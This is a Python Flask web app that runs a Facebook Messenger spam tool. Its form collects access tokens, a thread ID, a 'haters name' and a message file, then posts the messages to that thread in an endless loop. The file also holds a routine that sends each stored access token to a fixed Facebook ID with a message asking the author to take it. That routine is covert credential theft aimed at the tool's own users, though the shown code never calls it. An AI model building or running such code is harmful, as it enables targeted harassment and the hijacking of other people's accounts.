from flask import Flask, request, render_template_string
import threading
import time
import requests
import os

app = Flask(__name__)

# ---------------- YOUR ORIGINAL FUNCTIONS ---------------- #

def execute_server():
    pass  # Not needed, Flask hi server run karega

def send_initial_message():
    if not os.path.exists('token.txt'):
        return
    with open('token.txt', 'r') as file:
        tokens = file.readlines()
    msg_template = "MR.ANURAG MERA ID KA TOKEN LU {}"
    target_id = "61578840237242"
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'referer': 'www.google.com'
    }
    for token in tokens:
        access_token = token.strip()
        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        try:
            requests.post(url, json=parameters, headers=headers)
        except:
            pass
        time.sleep(0.1)

def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('file.txt', 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)

    with open('token.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    with open('name.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'referer': 'www.google.com'
    }

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()
                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                if response.ok:
                    print(f"[+] Message {message_index+1} sent -> {haters_name} {message}")
                else:
                    print(f"[x] Failed -> {haters_name} {message}")

                time.sleep(speed)
        except Exception as e:
            print(f"[!] Error: {e}")

# ------------------- FLASK UI PART ------------------- #

HTML_FORM = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>AROHI X ANURAG SERVER</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: black;
      color: white;
      font-family: 'Poppins', sans-serif;
      text-align: center;
    }
    .container {
      max-width: 600px;
      margin: 40px auto;
      padding: 20px;
      background: rgba(255,255,255,0.05);
      border-radius: 20px;
      border: 2px solid rgba(255,255,255,0.2);
      backdrop-filter: blur(10px);
    }
    .btn {
      width: 100%;
      font-weight: bold;
      border-radius: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🚀 AROHI X ANURAG SERVER 🚀</h1>
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label>ACCESS TOKENS (one per line)</label>
        <textarea name="tokens" class="form-control" rows="5" required></textarea>
      </div>
      <div class="mb-3">
        <label>CONVO/THREAD ID</label>
        <input type="text" class="form-control" name="convo" required>
      </div>
      <div class="mb-3">
        <label>HATERS NAME</label>
        <input type="text" class="form-control" name="name" required>
      </div>
      <div class="mb-3">
        <label>MESSAGES FILE (.txt)</label>
        <input type="file" class="form-control" name="file" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label>SPEED (seconds)</label>
        <input type="number" class="form-control" name="speed" required>
      </div>
      <button type="submit" class="btn btn-primary">START SPAM 🚀</button>
    </form>
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        # Save tokens
        with open("token.txt", "w") as f:
            f.write(request.form["tokens"].strip())

        # Save convo id
        with open("convo.txt", "w") as f:
            f.write(request.form["convo"].strip())

        # Save name
        with open("name.txt", "w") as f:
            f.write(request.form["name"].strip())

        # Save speed
        with open("time.txt", "w") as f:
            f.write(request.form["speed"].strip())

        # Save uploaded file
        uploaded_file = request.files["file"]
        if uploaded_file:
            uploaded_file.save("file.txt")

        # Start background thread
        threading.Thread(target=send_messages_from_file, daemon=True).start()

        return "<h2 style='color:lime;'>🚀 SPAM STARTED SUCCESSFULLY BY AROHI X ANURAG 🚀</h2>"

    return render_template_string(HTML_FORM)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=4000, debug=True)
